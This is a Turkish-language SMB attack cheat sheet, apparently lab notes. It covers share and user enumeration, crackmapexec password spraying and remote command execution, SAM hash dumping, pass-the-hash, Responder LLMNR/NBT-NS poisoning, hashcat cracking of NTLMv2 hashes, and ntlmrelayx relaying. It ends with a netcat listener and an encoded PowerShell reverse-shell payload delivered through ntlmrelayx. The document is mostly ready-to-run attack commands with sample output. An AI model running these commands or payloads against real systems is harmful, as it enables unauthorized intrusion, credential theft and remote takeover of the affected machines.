# smb


## nmap ile scan

```bash
sudo nmap 10.129.14.128 -sV -sC -p139,445
```


## paylaşılan dosyaları görme

```bash
smbclient -N -L //10.129.14.128
```

## smbmap ile detaylı tarama

```bash
smbmap -H 10.129.14.128
```

## rpcclient ile enumeration

```bash
rpcclient -U'%' 10.10.110.17
```

## enum4linux ile tarama

```bash
enum4linux 10.10.11.45 -A -C 
```

## crackmapexec ile brute force

```bash
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth --continue-on-success
```



# Remote Code Execution (RCE)


## 1.  Impacket PsExec

**hedef makinemizin alan adı / kullanıcı adı, şifre ve IP adresini sağlamamız gerekir**

```bash
impacket-psexec administrator:'Password123!'@10.10.110.17
```


## 2. CrackMapExec

- `smb`: Kullanılacak protokol
- IP adresi veya IP aralığı: Hedef host(lar)
- `-u`: Kullanıcı adı
- `-p`: Parola
- `-x`: CMD komutu çalıştırır
- `-X`: PowerShell komutu çalıştırır

- `--exec-method` ile `smbexec` veya `atexec` gibi yöntemler seçilebilir (önceki notta anlatılan teknikler).
- Çoklu host için IP aralığı verilebilir (ör. `10.10.110.0/24`).

```bash
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

### CrackMapExec ile kayıtlı kullanıcıları numaralandırmak


```bash
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users


SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX

```


#### Extract Hashes from SAM Database

**username password yukarıdaki komutdan geldi**

```bash
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam


SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

##### hashi aldıkdan sonra

```bash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE


SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
```

**(Pwn3d!)** geldiyse sistemde windows yada her neyse orada yetkili bir kullanıcı oldugunu doğrular


## 3. `Responder` With Forced Authentication Attacks

**Ana Mantık:**
Yanlış yazılan `\mysharedfolder\` => `\mysharefoder\` paylaşım adı çözülemez, sistem multicast (LLMNR/NBT-NS) sorgusu gönderir ve  sırayla hepsine istek atar 

+ hosts dosyası (C:\Windows\System32\Drivers\etc\hosts)
+ Yerel DNS cache
+ Yapılandırılmış DNS sunucusu
+ Multicast sorgular (LLMNR / NBT-NS)

sonrada Responder gibi sahte bir sunucu cevap vererek kimlik bilgisi yakalar.

```bash
responder -I <interface name>
```

**örn:**


```bash
sudo responder -I ens33


[+] Current Session Variables:                                                     
    Responder Machine Name     [WIN-2TY1Z1CIGXH]   
    Responder Domain Name      [HF2L.LOCAL]                                        
    Responder DCE-RPC Port     [48162] 

[+] Listening for events... 

[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000

```

**Ele geçirilen bu kimlik bilgileri, `hashcat` kullanılarak kırılabilir ya da kimlik doğrulama sürecini tamamlayıp kullanıcıyı taklit etmek amacıyla uzak bir ana bilgisayara iletilebilir.**



```bash
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Eğer hash değerini kıramazsak Ele geçirdiğimiz bu hash değerini `impacket-ntlmrelayx` veya `Responder MultiRelay.py` araçlarını kullanarak başka bir makineye aktarabiliriz (relay edebiliriz).**

- [ ] Öncelikle, responder yapılandırma dosyamızda (/etc/responder/Responder.conf) SMB ayarını KAPALI (OFF) konuma getirmemiz gerekiyor.
 
```bash
cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

- [ ] Ardından, `--no-http-server` ve `-smb2support` seçenekleriyle, hedef makineyi de `-t` parametresiyle belirterek `impacket-ntlmrelayx` aracını çalıştırırız. `impacket-ntlmrelayx` varsayılan olarak **SAM** veritabanının dökümünü alır; ancak `-c` seçeneğini ekleyerek komutlar da çalıştırabiliriz.

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

 
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xeb0432b45874953711ad55884094e9d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::
demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Done dumping SAM hashes for host: 10.10.110.146
```

- [ ] rev shell ile shell alabiliriz

**listener aç**


```bash
nc -lvnp 9001
```

**<https://www.revshells.com/> buradan powershell payload al ve gönder**


```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```


